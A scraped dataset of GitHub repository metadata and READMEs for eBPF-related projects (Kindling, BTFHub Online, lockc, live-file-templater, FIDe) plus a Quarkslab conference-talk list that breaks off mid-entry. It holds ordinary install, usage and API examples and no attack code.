## Get started

You can deploy Kindling easily, check out the [Installation Guide](http://kindling.harmonycloud.cn/docs/installation/kindling-agent/requirements/) for details.

## Documentation

The Kindling documentation is available on our [Kindling website](http://kindling.harmonycloud.cn/docs/overview-and-concepts/overview/)

## Contributing 

Contributions are welcome, you can contribute in many ways: report issues, help us reproduce issues, fix bugs, add features, give us advice on GitHub discussion, and so on. If you are interested in joining us to unveil the eBPF in the Kubernetes area, you can start by reading the [Contributing Guide](https://github.com/KindlingProject/kindling/blob/main/CONTRIBUTING.md).

## Contact

If you have questions or ideas, please feel free to reach out to us in the following ways:

- Check out the [discussions](https://github.com/KindlingProject/kindling/discussions)
- Join the Kindling [Slack channel](https://join.slack.com/t/kindling-world/shared_invite/zt-1rmki34l0-JiFpWFR7YhqlXG~mSQQAtg)
- Join the WeChat Group (in Chinese)

![img](/docs/imgs/wechat-code.png)

## License

Kindling is distributed under [Apache License, Version2.0](https://github.com/KindlingProject/kindling/blob/main/LICENSE).

"
seek-ret/btfhub-online,17,1,17,1,Shell,## Auto-archived due to inactivity. ## BTFHub repo,2021-12-11T17:51:18Z,2024-09-23T12:03:38Z,35,"# BTFHub online
BTFHub online is the online version of the great [BTFHub project](https://github.com/aquasecurity/btfhub).
The purpose of the online version is to make it easier for developers to fetch their relevant BTF for their BPF binary.

The project will allow you to be ""forward compatible"" with new minor versions or patches of your kernel being released.

# The problem
In the recent years eBPF became more and more common among developers and companies. Most of them have used BCC toolkit
it was the common toolkit for eBPF. But BCC have major drawback, among them, we can find portability issue.

To overcome that issue (and some other issues) there is a movement to libbpf toolkit with the great addition of CORE
(Compile Once Run Everywhere). To use libbpf+CORE, one must supply a file called BTF (BPF Type Format) which holds data
that can tell how to make a BPF code compatible in the current host's kernel (Where to find structs in the kernel, how 
they are arranged, etc.). Latest kernel versions do have a default BTF file at `/sys/kernel/btf/vmlinux`, but older kernels
does not have such file. The solution for them is to generate such BTF files to all versions of the old kernel.
Gladly, [BTFHub](https://github.com/aquasecurity/btfhub) have done most of the hard work and generated BTFs for old kernels
and their updates. BTFHub even added a script to generate a minimized and customized BTFs for a given BPF (a BTF that contain
only relevant data to your BPF). So you can create a directory with thousands of BTFs with a few MBs.

But, unfortunately kernel can be updated, and your local directory of the BTFs might be outdated for the latest kernel update.
Here BTFHub-Online comes in!

BTFHub Online supplies an online server that is able to supply a BTF (customized or not) live!
You BPF program just need to send a request to the server, and it will immediately get the relevant BTF.
Using the online version you gain:
* ""Forward compatability"" to new kernel patches
* No need to generate the local directory of BTFs
* Easy integration


# Access
The server is open for free access at https://btfhub.seekret.io (checkout the [SDK list](#list-of-sdks) for easy integration)

Of course, you can set up and host your server by your own (checkout the [deployment section](#deploy))
Currently we wrap deployment for:
* k8s

# Table of Content
1. [Visual Diagram](#visual-diagram)
2. [Mode or operation](#mode-of-operation)
   1. [List of SDKs](#list-of-sdks)
3. [Examples](#examples)
4. [Docker build](#docker-build)
5. [Deploy](#deploy)
   1. [k8s](#k8s-with-kong-api-gateway-and-gcp-bucket-archive)
6. [Contributing](#contributing)
7. [TODO List](#todo-list)
8. [Credits](#credits)

# Visual Diagram
![](docs/BTFHubOnline.jpg)

# Mode of operation
While developing your eBPF module, use our SDKs or the api documentation to dynamically pull the BTF that suites
your eBPF module.

## List of SDKs
1. [GO](https://github.com/seek-ret/btfhub-online-go)
2. [OpenAPI 3 spec](./docs/openapi.yaml)

## Examples
### Run server locally
```bash
make update-dependencies
GOOGLE_APPLICATION_CREDENTIALS=<service account json> go run cmd/btfserver/main.go -t ./tools -p 8080 -b <bucket name>
```

### List all BTFs in the server
```bash
curl ""https://btfhub.seekret.io/api/v1/list""
```

### Download a single BTF
```bash
curl ""https://btfhub.seekret.io/api/v1/download?distribution=ubuntu&distribution_version=20.04&kernel_version=5.11.0-1022-gcp&arch=x86_64"" -o btf.tar.gz
```

### Customize a single BTF
```bash
curl -X POST ""https://btfhub.seekret.io/api/v1/customize?distribution=ubuntu&distribution_version=20.04&kernel_version=5.11.0-1022-gcp&arch=x86_64"" -F bpf=@<path to bpf.core.o> -o btf.tar.gz
```

### Getting metrics
```bash
curl ""https://btfhub.seekret.io/monitoring/metrics""
```

### Getting health check
```bash
curl ""https://btfhub.seekret.io/monitoring/health""
```

# Docker build

```bash
docker build -f btfserver.Dockerfile -t ""<image>"" .
```

# Deploy
## K8S with kong api gateway and gcp bucket archive
```bash
helm dependency build deployments/k8s
helm upgrade -i btfhub ./deployments/k8s --set arguments.bucket_name=btfhub           \
  --set-file arguments.gcp_bucket.service_account_content=<service account json file> \
  --set-file ingress.tls.cert=<tls certificate>                                       \
  --set-file ingress.tls.key=<tls key>                                                \
  --set kong.proxy.loadBalancerIP=<external IP>                                       \
  --set ingress.host=<btfhub.example.com>                                             \
  --set ""ingress.domain=<*.company.com>"" 
```

# Contributing

We are welcome you to contribute in any manner there is.
We care a lot from the community, thus please read our [code of conduct](./CODE_OF_CONDUCT.md) before contributing.
You don't have to develop to contribute to the community, and you can do it in one of the following ways:

1. Open issues (bugs, feature requests)
2. Develop the code (read [contributing.md](./CONTRIBUTING.md))
   1. Check the [TODO List](#todo-list) to find good issues to start with.
3. Mention us (twitter, linkedin, blogs)

# TODO List
 - [ ] Add more http metrics
 - [ ] Add python SDK
 - [ ] Add RUST SDK
 - [ ] Add ARM support
 - [ ] Add local directory archive support
 - [ ] Add AWS bucket support
 - [ ] Add cloud run / cloud function deployment in GCP
 - [ ] Add lambda deployment in AWS
 - [ ] Add updater job instead of GitHub Actions

# Credits

Thanks to:

* Aqua Security for creating [BTFHub](https://github.com/aquasecurity/btfhub)."
lockc-project/lockc,230,21,230,23,Rust,Making containers more secure with eBPF and Linux Security Modules (LSM),2021-04-22T21:10:52Z,2025-07-19T10:24:56Z,370,"![lockc](https://raw.githubusercontent.com/lockc-project/assets/main/logo-horizontal-lockc.png)

[![Crate](https://img.shields.io/crates/v/lockc)](https://crates.io/crates/lockc)
[![Book](https://img.shields.io/website?url=https%3A%2F%2Flockc-project.github.io%2Flockc%2F)](https://lockc-project.github.io/lockc/)
[![Discord](https://img.shields.io/discord/874314181191565453?label=discord&logo=discord)](https://discord.gg/799cmsYB4q)
[![Docs](https://docs.rs/lockc/badge.svg)](https://docs.rs/lockc/)
[![Build Status](https://github.com/lockc-project/lockc/actions/workflows/rust.yml/badge.svg)](https://github.com/lockc-project/lockc/actions/workflows/rust.yml)

**lockc** is open source sofware for providing MAC (Mandatory Access Control)
type of security audit for container workloads.

The main reason why **lockc** exists is that **containers do not contain**.
Containers are not as secure and isolated as VMs. By default, they expose
a lot of information about host OS and provide ways to ""break out"" from the
container. **lockc** aims to provide more isolation to containers and make them
more secure.

The [Containers do not contain](https://lockc-project.github.io/book/containers-do-not-contain.html)
documentation section explains what we mean by that phrase and what kind of
behavior we want to restrict with **lockc**.

The main technology behind lockc is [eBPF](https://ebpf.io/) - to be more
precise, its ability to attach to [LSM hooks](https://docs.kernel.org/bpf/prog_lsm.html)

Please note that currently lockc is an experimental project, not meant for
production environment and without any official binaries or packages to use -
currently the only way to use it is building from sources.

See [the full documentation here](https://lockc-project.github.io/).
And [the code documentation here](https://docs.rs/lockc/).

If you need help or want to talk with contributors, plese come chat with us
on `#lockc` channel on the [Rust Cloud Native Discord server](https://discord.gg/799cmsYB4q).

**lockc's** userspace part is licensed under [Apache License, version 2.0](https://github.com/lockc-project/lockc/blob/main/LICENSE).

eBPF programs inside [lockc/src/bpf directory](https://github.com/lockc-project/lockc/tree/main/lock-ebpf)
are licensed under [GNU General Public License, version 2](https://github.com/lockc-project/lockc/blob/main/lockc-ebpf/LICENSE).
"
quarkslab/conf-presentations,305,35,305,0,,Quarkslab conference talks,2019-03-27T15:54:43Z,2025-10-07T09:03:31Z,224,"
## Table of Contents
- [Quarkslab Lectures at Conferences and Seminars](#quarkslab-lectures-at-conferences-and-seminars)
- [Quarkslab Publications in Journals or Conference Proceedings and Preprints](#quarkslab-publications-in-journals-or-conference-proceedings-and-preprints)
- [Quarkslab Publications in Specialized Magazines](#quarkslab-publications-in-specialized-magazines)
- [Quarkslab Hardware CTFs](#quarkslab-hardware-ctfs)

## Quarkslab Lectures at Conferences and Seminars


### 2025

 - 2025-07: [Experimental Study of Binary Diffing Resilience on Obfuscated Programs ðŸ–¥ï¸](Confs/DIMVA25/dimva-slides-25.pdf)[ðŸ“œ](Confs/DIMVA25/dimva-25.pdf) at *[22nd Conference on Detection of Intrusions and Malware & Vulnerability Assessment, DIMVA 2025](https://dimva.org/dimva2025/)*
 - 2025-07: [The Last Resort: Debugging Embedded Systems with Unconventional Methods ðŸ–¥ï¸](Confs/PTS25/PTS2025-TALK-01-debugging_embedded.pdf)[ðŸ“½ï¸](https://passthesalt.ubicast.tv/videos/the-last-resort-debugging-embedded-systems-with-unconventional-methods-trimmed/) at *[Pass the SALT 2025](https://2025.pass-the-salt.org/)*
 - 2025-07: [Wirego, a Wireshark plugin development framework ðŸ–¥ï¸](Confs/PTS25/PTS2025-TALK-14-Wirego.pdf)[ðŸ“½ï¸](https://passthesalt.ubicast.tv/videos/wirego-a-wireshark-plugin-development-framework-trimmed/) at *[Pass the SALT 2025](https://2025.pass-the-salt.org/)*
 - 2025-06: [Abusing Domestic EV Chargers through Bluetooth and USB ðŸ–¥ï¸](Confs/Recon25/Recon25-Abusing-EV-Chargers-rmori-rdavid-achazal.pdf) at *[Recon.cx 2025](https://recon.cx/2025/)*
 - 2025-06: [Pyrrha & Friends: Diving into Firmware Cartography ðŸ–¥ï¸](Confs/SSTIC25/SSTIC2025-Slides-pyrrha_diving_into_firmware_cartography-brocas_david.pdf)[ðŸ“½ï¸](https://static.sstic.org/videos2025/1080p/pyrrha_diving_into_firmware_cartography.mp4) at *[SSTIC 2025](https://www.sstic.org/2025/programme/)*
 - 2025-06: [We Have A Deal: we provide the lego bricks, you build cool wireless attacks ðŸ–¥ï¸](Confs/SSTIC25/SSTIC2025-Slides-we_have_a_deal_we_provide_the_lego_bricks_you_build_cool_wireless_attacks-cauquil_cayre.pdf)[ðŸ“œ](Confs/SSTIC25/SSTIC2025-Article-we_have_a_deal_we_provide_the_lego_bricks_you_build_cool_wireless_attacks-cauquil_cayre.pdf)[ðŸ“½ï¸](https://static.sstic.org/videos2025/1080p/we_have_a_deal_we_provide_the_lego_bricks_you_build_cool_wireless_attacks.mp4) at *[SSTIC 2025](https://www.sstic.org/2025/programme/)*
 - 2025-06: [Wirego - Un framework de dÃ©veloppement de plugins Wireshark ðŸ–¥ï¸](Confs/SSTIC25/SSTIC2025-Slides-wirego_un_framework_de_developpement_de_plugins_wireshark-girard.pdf)[ðŸ“œ](Confs/SSTIC25/SSTIC2025-Article-wirego_un_framework_de_developpement_de_plugins_wireshark-girard.pdf)[ðŸ“½ï¸](https://static.sstic.org/videos2025/1080p/wirego_un_framework_de_developpement_de_plugins_wireshark.mp4) at *[SSTIC 2025](https://www.sstic.org/2025/programme/)*
 - 2025-06: [apkpatcher : Fast analysis and modification to Android applications without root access or emulation ðŸ–¥ï¸](Confs/SSTIC25/SSTIC2025-Slides-apkpatcherv2-forgette.pdf)[ðŸ“½ï¸](https://static.sstic.org/videos2025/1080p/apkpatcherv2.mp4) at *[SSTIC 2025](https://www.sstic.org/2025/programme/)*
 - 2025-05: [Spyware for Rent & The World of Offensive Cyber ðŸ–¥ï¸](Confs/Off-By-One-2025/25-05-08-OffbyOne-Spyware-to-rent-and-offensive-world-reloaded.pdf)[ðŸ“½ï¸](https://www.youtube.com/watch?v=GaR1QVuvhkU) at *[Off-by-One 2025](https://offbyone.sg/agenda/)*
 - 2025-05: [S.H.I.E.L.D: Scudo Heap Implementation Exploits, Leaks, and Defenses ðŸ–¥ï¸](Confs/Off-By-One-2025/25-05-08-OffByOne-SHIELD-Scudo-Heap-Implementation-Exploits-Leaks-Defenses.pdf)[ðŸ“½ï¸](https://www.youtube.com/watch?v=1BqFyOgGN2M) at *[Off-by-One 2025](https://offbyone.sg/agenda/)*
 - 2025-04: [Test your Cryptographic Primitives with Crypto-Condor ðŸ–¥ï¸](Confs/RealWorldCrypto-Paris/2025-04-29-rwcp_jloayza_crypto_condor.pdf) at *[Real World Cryptography Paris Meetups](https://cryptography.paris/)*
 - 2025-04: [One for all and all for WHAD: wireless shenanigans made easy ! ðŸ–¥ï¸](Confs/THCon25/thcon-cauquil-cayre-keynote.pdf)[ðŸ“½ï¸](https://www.youtube.com/live/rqKiDgecRwM?si=u-rcSvi2O-uI7Bbh&t=17557) at *[THCon 2025](https://thcon.party/)*
 - 2025-03: [0day in CTF is cool, no? (Writeup PwnMe 2025) ðŸ–¥ï¸](Confs/HTBFrance2025/Meetup%20HTB%20France%20-%200day%20in%20CTF%20is%20cool%20-%20Writeup%20PwnMe%202025.pdf) at *[Meetup Hack The Box France](https://www.meetup.com/hack-the-box-meetup-france/events/306897502/)*
 - 2025-03: [Streamlining Firmware Analysis with Inter-Image Call Graphs and Decompilation ðŸ–¥ï¸](Confs/REverse-25/REverse_firmware_analysis_2025.pdf)[ðŸ“½ï¸](https://www.youtube.com/watch?v=LsDnrfZt_Xs) at *[RE/verse.io 2025](https://re-verse.io)*

### 2024

 - 2024-12: [Identifying Obfuscated Code through Graph-Based Semantic Analysis of Binary Code ðŸ–¥ï¸](Confs/ComplexNetworks2024/complexnetworks2024_slides.pdf)[ðŸ“œ](Confs/ComplexNetworks2024/complexnetworks2024_paper.pdf) at *[Complex Networks 2024](https://complexnetworks.org/)*
 - 2024-12: [*Invited talk:* MIFARE Classic: exposing the static encrypted nonce variant... and a few hardware backdoors ðŸ“½ï¸](https://www.youtube.com/watch?v=uw8N4IhQc0s) at *[COSIC Seminar, KUL](https://www.esat.kuleuven.be/cosic/cosic-seminars/)*
 - 2024-12: [Faster Signatures from MPC-in-the-Head ðŸ“œ](https://eprint.iacr.org/2024/252.pdf) at *[Asiacrypt 2024](https://asiacrypt.iacr.org/2024/)*
 - 2024-11: [*Invited talk:* MIFARE Classic: exposing the static encrypted nonce variant... and a few hardware backdoors ðŸ–¥ï¸](Confs/C%26ESAR-2024/2024-11-21-mifare-pteuwen-ecw-cesar.pdf)[ðŸ“œ](https://2024.cesar-conference.org/program-media/CESAR-2024_keynote-MiFare.pdf)[ðŸ“½ï¸](https://2024.cesar-conference.org/program-media/CESAR-2024_6-2_keynote-MiFare.webm) at *[C&ESAR 2024 by DGA](https://2024.cesar-conference.org/detailed-program/)*
 - 2024-11: [Improving binary diffing through similarity and matching intricacies ðŸ–¥ï¸](Confs/CAID-2024/CAID24_raffinement_diffing_binaire_slides.pdf)[ðŸ“œ](Confs/CAID-2024/CAID24_raffinement_diffing_binaire_paper.pdf) at *[CAID: Conference on Artificial Intelligence for Defense](https://caid-conference.eu)*
 - 2024-11: [*Invited talk:* MIFARE Classic: exposing the static encrypted nonce variant ðŸ–¥ï¸](Confs/GreHack2024/2024-11-15-mifare-pteuwen-grehack.pdf)[ðŸ“½ï¸](https://www.youtube.com/watch?v=SJTiuk4gxhc) at *[Grehack 2024](https://grehack.fr/)*
 - 2024-10: [Bluetooth Low Energy GATT Fuzzing: from specification to implementation ðŸ–¥ï¸](Confs/Hardweario-NL-2024/2024-10-25-ble-gatt-fuzzing-bboyer.pdf)[ðŸ“œ](Confs/Hardweario-NL-2024/2024-10-25-ble-gatt-fuzzing-paper-bboyer.pdf)[ðŸ“½ï¸](https://www.youtube.com/watch?v=L2ocCDl5e1g) at *[Hardwear.io NL 2024](https://hardwear.io/netherlands-2024/)*
 - 2024-10: [MIFARE Classic: exposing the static encrypted nonce variant ðŸ–¥ï¸](Confs/Hardweario-NL-2024/2024-10-24-mifare-pteuwen.pdf)[ðŸ“½ï¸](https://www.youtube.com/watch?v=rdH4dbshGUU) at *[Hardwear.io NL 2024](https://hardwear.io/netherlands-2024/)*
 - 2024-10: [Spyware for Rent ðŸ–¥ï¸](Confs/Les%20Assises%20-%202024/24-10-10-Monaco-Spyware-to-rent.pdf) at *[Les Assises 2024](https://www.lesassisesdelacybersecurite.com/fr-FR/le-programme/le-deroule-des-4-jours)*
 - 2024-08: [De 'branch' en 'branch' : rÃ©cupÃ©ration d'un FW d'ECU sur une mÃ©moire FAT 'nettoyÃ©e' ðŸ–¥ï¸](Confs/Barbhack24/Barbhack_2024_De_branch_en_branch.pdf) at *[Barbhack 2024](https://www.barbhack.fr/2024/en/)*
 - 2024-08: [One for all and all for WHAD: wireless shenanigans made easy ! ðŸ–¥ï¸](Confs/DefCon2024/dc32-cauquil-cayre-One_for_all_and_all_for_whad-v4.pdf)[ðŸ“½ï¸](https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20video%20and%20slides/DEF%20CON%2032%20-%20One%20for%20All%20-%20and%20All%20for%20WHAD%20-%20wireless%20shenanigans%20made%20easy%20-%20Romain%20Cayre%2C%20Damien%20Cauquil.mp4) at *[DEF CON 32](https://defcon.org/html/defcon-32/dc-32-speakers.html#54472)*
 - 2024-08: [Attacking Samsung Galaxy A * Boot Chain, and Beyond ðŸ–¥ï¸](Confs/BlackHat-USA-24/BH-USA-2024_Attacking-Samsung.pdf) at *[Black Hat USA 2024](https://www.blackhat.com/us-24/briefings/schedule/index.html#attacking-samsung-galaxy-a-boot-chain-and-beyond-38526)*
 - 2024-07: [Prism, a light BEAM disassembler ðŸ–¥ï¸](Confs/LeHack24/lehack24-dcauquil-prism-light-beam-disassembler.pdf) at *[LeHack 2024](https://lehack.org/)*
 - 2024-07: [Analysing malicious documents and files with oletools ðŸ–¥ï¸](Confs/PTS24/PTS2024-TALK-19-oletools.pdf)[ðŸ“½ï¸](https://passthesalt.ubicast.tv/videos/2024-analysing-malicious-documents-and-files-with-oletools/) at *[Pass the SALT 2024](https://cfp.pass-the-salt.org/pts2024/schedule/#)*
 - 2024-07: [Rump: Passbolt: a bold use of HaveIBeenPwned ðŸ–¥ï¸](Confs/PTS24/PTS2024-RUMP-14_Passbolt_Teuwen.pdf)[ðŸ“½ï¸](https://passthesalt.ubicast.tv/videos/2024-rump-14-passbolt-a-bold-use-of-haveibeenpwned/) at *[Pass the SALT 2024](https://cfp.pass-the-salt.org/pts2024/schedule/#)*
 - 2024-07: [Rump: How to download large datasets of files using CommonCrawl ðŸ–¥ï¸](Confs/PTS24/PTS2024-RUMP-11-CommonCrawl_Lagadec.pdf)[ðŸ“½ï¸](https://passthesalt.ubicast.tv/videos/2024-rump-11-how-to-download-large-datasets-of-files-using-commoncrawl/) at *[Pass the SALT 2024](https://cfp.pass-the-salt.org/pts2024/schedule/#)*
 - 2024-07: [Hydradancer, using USB3 to improve USB hacking with Facedancer ðŸ–¥ï¸](Confs/PTS24/PTS2024-TALK-15-Hydradancer_using_usb3_to_improve_facedancer.pdf)[ðŸ“½ï¸](https://passthesalt.ubicast.tv/videos/2024-hydradancer-using-usb3-to-improve-usb-hacking-with-facedancer/) at *[Pass the SALT 2024](https://cfp.pass-the-salt.org/pts2024/schedule/#)*
 - 2024-07: [Test your cryptographic primitives with crypto-condor ðŸ–¥ï¸](Confs/PTS24/PTS2024-TALK-14-Crypto-condor.pdf)[ðŸ“½ï¸](https://passthesalt.ubicast.tv/videos/2024-test-your-cryptographic-primitives-with-crypto-condor/) at *[Pass the SALT 2024](https://cfp.pass-the-salt.org/pts2024/schedule/#)*
 - 2024-07: [Prism, a light BEAM disassembler ðŸ–¥ï¸](Confs/PTS24/PTS2024-TALK-05-BEAM-disassembler.pdf)[ðŸ“½ï¸](https://passthesalt.ubicast.tv/videos/2024-prism-a-light-beam-disassembler/) at *[Pass the SALT 2024](https://cfp.pass-the-salt.org/pts2024/schedule/#)*
 - 2024-06: [Attacking the Samsung Galaxy Boot Chain ðŸ–¥ï¸](Confs/Off-By-One-2024/Off-By-One-2024_Attacking_Samsung.pdf) at *[Off-by-One 2024](https://offbyone.sg/agenda/)*
 - 2024-06: [Belenios: the Certification Campaign ðŸ–¥ï¸](Confs/SSTIC24/SSTIC2024-Slides-belenios_the_certification_campaign-bossuat_brocas_kovacs_gaudry_glondu_cortier.pdf)[ðŸ“œ](Confs/SSTIC24/SSTIC2024-Article-belenios_the_certification_campaign-bossuat_brocas_kovacs_gaudry_glondu_cortier.pdf)[ðŸ“½ï¸](https://static.sstic.org/videos2024/1080p/belenios_the_certification_campaign.mp4) at *[SSTIC 2024](https://www.sstic.org/2024/programme/)*
 - 2024-06: [Tame the (q)emu: debug firmware on custom emulated board ðŸ–¥ï¸](Confs/SSTIC24/SSTIC2024-Slides-tame_the_qemu_debug_firmware_on_custom_emulated_board-cauquil.pdf)[ðŸ“œ](Confs/SSTIC24/SSTIC2024-Article-tame_the_qemu_debug_firmware_on_custom_emulated_board-cauquil_gwqDg32.pdf)[ðŸ“½ï¸](https://static.sstic.org/videos2024/1080p/tame_the_qemu_debug_firmware_on_custom_emulated_board.mp4) at *[SSTIC 2024](https://www.sstic.org/2024/programme/)*
 - 2024-06: [PyAxml ðŸ–¥ï¸](Confs/SSTIC24/SSTIC2024-Slides-pyaxml-forgette.pdf)[ðŸ“½ï¸](https://static.sstic.org/videos2024/1080p/pyaxml.mp4) at *[SSTIC 2024](https://www.sstic.org/2024/programme/)*
 - 2024-06: [When Samsung meets Mediatek: the story of a small bug chain ðŸ–¥ï¸](Confs/SSTIC24/SSTIC2024-Slides-when_vendor1_meets_vendor2_the_story_of_a_small_bug_chain-rossi-bellom_neveu.pdf)[ðŸ“œ](Confs/SSTIC24/SSTIC2024-Article-when_vendor1_meets_vendor2_the_story_of_a_small_bug_chain-rossi-bellom_neveu.pdf)[ðŸ“½ï¸](https://static.sstic.org/videos2024/1080p/when_vendor1_meets_vendor2_the_story_of_a_small_bug_chain.mp4) at *[SSTIC 2024](https://www.sstic.org/2024/programme/)*
 - 2024-06: [QBinDiff: A modular differ to enhance binary diffing and graph alignment ðŸ–¥ï¸](Confs/SSTIC24/SSTIC2024-Slides-qbindiff_a_modular_differ-rossi_yger_mori_david_cohen.pdf)[ðŸ“½ï¸](https://static.sstic.org/videos2024/1080p/qbindiff_a_modular_differ.mp4) at *[SSTIC 2024](https://www.sstic.org/2024/programme/)*
 - 2024-06: [Testez vos primitives cryptographiques avec crypto-condor ðŸ–¥ï¸](Confs/SSTIC24/SSTIC2024-Slides-testez_vos_primitives_cryptographiques_avec_crypto_condor-bossuat_goudarzi_loayza-meneses.pdf)[ðŸ“½ï¸](https://static.sstic.org/videos2024/1080p/testez_vos_primitives_cryptographiques_avec_crypto_condor.mp4) at *[SSTIC 2024](https://www.sstic.org/2024/programme/)*
 - 2024-05: [Numbat/Pyrrha: Naviguez facilement dans les binaires de votre systÃ¨me ðŸ–¥ï¸](Confs/ESE24/slides.pdf) at *[ESIEA Secure Edition 2024](https://ese.esiea.fr/)*
 - 2024-05: [Finding low-hanging fruits vulnerabilities in a commercial antivirus ðŸ–¥ï¸](Confs/StHack24/slides_sthack_2024_v1.8.pdf) at *[StHack 2024](https://www.sthack.fr/)*
 - 2024-05: [Attacking the Samsung Galaxy A * Boot Chain ðŸ–¥ï¸](Confs/OffensiveCon24/AttackingSamsung.pdf)[ðŸ“½ï¸](https://www.youtube.com/watch?v=WJ7wkJn7l7w) at *[OffensiveCon 2024](https://www.offensivecon.org/agenda/2024.html)*
 - 2024-04: [PASTIS: Fuzzing tool competition ðŸ–¥ï¸](Confs/SBFT-ICSE-24/SBFT-2024-pastis-tool.pdf) at *[SBFT 2024](https://sbft24.github.io/program/)*
 - 2024-03: [Finding low-hanging fruits vulnerabilities in a commercial antivirus ðŸ–¥ï¸](Confs/HSR2024/slides_HSR_2024_Diawara.pdf) at *[HackSecuReims 2024](https://www.hacksecureims.eu/conferences.html)*
 - 2024-03: [How automatisation can improve firmware analysis? ðŸ–¥ï¸](Confs/InCyber24/fic-24-firmware-analysis.pdf) at *[Forum InCyber 2024](https://fic.app.swapcard.com/widget/event/forum-incyber-2024/planning/UGxhbm5pbmdfMTgxMjc2Mw==)*
 - 2024-03: [Spyware for Rent ðŸ–¥ï¸](Confs/NullCon2024/24-03-15-Nullcon-Spyware-to-rent.pdf)[ðŸ“½ï¸](https://www.youtube.com/watch?v=D-nT0Uojr1s) at *[NullCon 2024](https://nullcon.net/berlin-2024/speaker-the-world-of-spyware-for-rent)*
 - 2024-01: [FCSC Chaussette - A Triton showcase ðŸ–¥ï¸](Confs/Ambrosia2024/2024-Ambrosia-FCSC-Chaussette-a-Triton-showcase.pdf) at *[Ambrosia 2024](https://web.archive.org/web/20240304004251/https://esnhack.fr/articles/article?id=7)*

### 2023

 - 2023-11: [Google Apps Script - this talk requires access to your e-mails ðŸ–¥ï¸](Confs/GreHack2023/GreHack2023_Google_Apps_Script-v1.0.pptx)[ðŸ“½ï¸](https://www.youtube.com/watch?v=mHJ1xjH-pq0) at *[GreHack 2023](https://grehack.fr/2023/program)*
 - 2023-11: [Breaking Secure Boot on the Silicon Labs Gecko platform ðŸ–¥ï¸](Confs/Ekoparty2023/2023-11-03-ekoparty-gecko_bootloader-fenrisfulsur.pdf)[ðŸ“½ï¸](https://www.youtube.com/watch?v=bWO9pIWd_Ok) at *[Ekoparty 2023](https://ekoparty.org/eko2023-agenda/breaking-secure-boot-on-the-silicon-labs-gecko-platform/)*
 - 2023-11: [Breaking Secure Boot on the Silicon Labs Gecko platform ðŸ–¥ï¸](Confs/Hardweario-NL-2023/2023-11-03-hwio_nl-gecko_bootloader-madsquirrel.pdf)[ðŸ“½ï¸](https://www.youtube.com/watch?v=WgXw6GgYz78) at *[Hardwear.io NL 2023](https://hardwear.io/netherlands-2023/speakers/beno%C3%AEt-and-sami.php)*
 - 2023-11: [Dissecting the Modern Android Data Encryption Scheme ðŸ–¥ï¸](Confs/Hardweario-NL-2023/HWIO23-An"
ChanderG/live-file-templater,6,0,6,0,Python,Dynamically re-templatize a folder of files. Powered by FUSE and eBPF.,2022-04-25T05:18:04Z,2025-07-16T07:30:25Z,6,"# lft - live file templater

Dynamically re-templatize a folder of files.
Powered by FUSE and eBPF.

![lft in action](demo.gif)

## What?

The problem this is meant is solve is the following:
1. You have a bunch of source template files that you want to fill variables in.
2. You don't know all the variables up-front.

Normally, you could use everything from `envsubst`, `jinja2`, `jq`, `yq` to `confd` to solve the problem of generating files from templates, but these 2 requirements make the process cumbersome. You will have to run them repeatedly on multiple inputs as your variables change.

How convenient would it be if env vars in files would resolve just like they would resolve in the shell, or in a script? As you update variables, the next command, the next line in the shell script would run differently. Similarly, what if files change as the env vars change?

Enter lft.

## Usage

Let's say you have a folder of files, each file consisting of env variables that you want to fill-in. For example, let us say, there is a folder `base1` with the following files:
```
hi.txt
subdir/notes.json
```

Where, `hi.txt` looks like:
```
My name is $NAME.
```
and, `subdir/notes.json` looks like this:
```
{
  ""id"": ""$ID"",
  ""name"": ""$NAME""
}
```

First, you run the command:
```
<path to lft>/lft.py ./base1 ./view1 &
```
where `view1` is an empty dir to be used as the mount point for the filled-in files.

Now, if you look at `view1`, you will find that it mirrors the `base1` directory.

Now, the following works:
```
$ NAME=chanderg
$ cat ./view1/hi.txt
My name is chanderg.
$ NAME=""not cg""
$ cat ./view1/hi.txt
My name is not cg.
```

You get the idea. Now, let's look at the other file in the folder.
```
$ cat ./view1/subdir/notes.json
{
  ""id"": """",
  ""name"": ""not cg""
}
```

Let's complete the example:
```
$ ID=""001""
$ cat ./view1/subdir/notes.json
{
  ""id"": ""001"",
  ""name"": ""not cg""
}
```

That's the general gist. As you update variables, the files automatically get updated.

## Install

You need `python3`, and `bpftrace` installed.

Run:
```
pip3 install -r requirements
```

and use the script.

Currently, it only works with bash, though it should be easy enough to extend to other shells.

## How does this magic work?

This is a *MEGA* hack.

Firstly, we use the magic of FUSE - File System in User Space to mount a virtual files system mirroring the original source directory of files. This is needed since we need the most direct way to update files - right before they are accessed.

Secondly, we use the magic of eBPF (specifically bpftrace) to snoop in on bash user space functions responsible for setting user variables. How did I get the right user space probe to use? By reading source-code? Oh no - by good old-fashioned trial/error. 

Start a bash shell and note it's pid. In a different shell, start out broad:
```
bpftrace -e 'uprobe:/usr/bin/bash:*env* { printf(""%s\n"", func) }' -p <pid of the first bash shell>
```
gets you all user space functions with the word ""env"" in it. That got us 16 probes, but setting variables in the first bash gets no fires.

Luckily, the next guess of trying functions of the form `*var*` worked:
```
bpftrace -e 'uprobe:/usr/bin/bash:*var* { printf(""%s\n"", func) }' -p <pid of the first bash shell>
```

which gets us around 90 probes, many of which fire when you run a simple `foo=bar` on the first bash:
```
bind_variable
make_variable_value
stupidly_hack_special_variables
bind_variable
make_variable_value
find_variable
var_lookup
dispose_used_env_vars
find_variable
var_lookup
...
...
...
```

Now, simply update the `printf` command in the bpftrace command to print out args and boom - the very first probe is a hit.

Now, the main python program runs the bpftrace command in a thread and reads from the subprocess stdout, updating local state as bash variables are updated. For simplicity, we only consider ALL_UPPER variables from bash.

The templated files are all stored in-memory for now.

## Acknowledgements

1. https://www.stavros.io/posts/python-fuse-filesystem/
2. https://github.com/fusepy/fusepy/blob/master/examples/memory.py

## LICENSE 

MIT
"
fukuda-lab/FIDe,7,0,7,0,C,FIDe is an fully in-kernel anomaly detection/mitigation framework based on eBPF.,2024-06-26T12:28:32Z,2025-06-15T16:05:40Z,10,"# FIDe
FIDe is a fully in-kernel anomaly detection/mitigation framework based on eBPF. The framework enables high-speed traffic monitoring and anomaly detection in generic Linux machines with NICs supporting native XDP. Further details on this framework is available on our paper [Dynamic Fixed-point Values in eBPF: a Case for Fully In-kernel Anomaly Detection](https://dl.acm.org/doi/abs/10.1145/3674213.3674219). 

If you use any components of our framework, please consider citing our work.
